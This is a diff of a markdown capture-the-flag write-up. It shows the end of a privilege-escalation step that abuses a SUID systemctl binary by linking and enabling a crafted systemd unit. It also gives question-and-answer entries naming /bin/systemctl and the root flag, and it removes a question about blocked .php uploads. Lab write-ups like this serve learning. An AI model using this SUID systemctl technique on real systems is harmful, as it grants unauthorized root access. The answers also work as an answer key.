@@ -97,10 +97,7 @@ WantedBy=multi-user.target'> $TF
 ./systemctl link $TF
 ./systemctl enable --now $TF
 ```
-#### Questions
-1. What common file type, which you'd want to upload to exploit the server, is blocked? Try a couple to find out. - **Answer** **.php** </code>
-
-#### Questions
+### Questions
 1. On the system, search for all SUID files. What file stands out? **Answer** **/bin/systemctl**
 
 2. Become root and get the last flag (/root/root.txt) **Answer**  **You can find it as a root Flag**
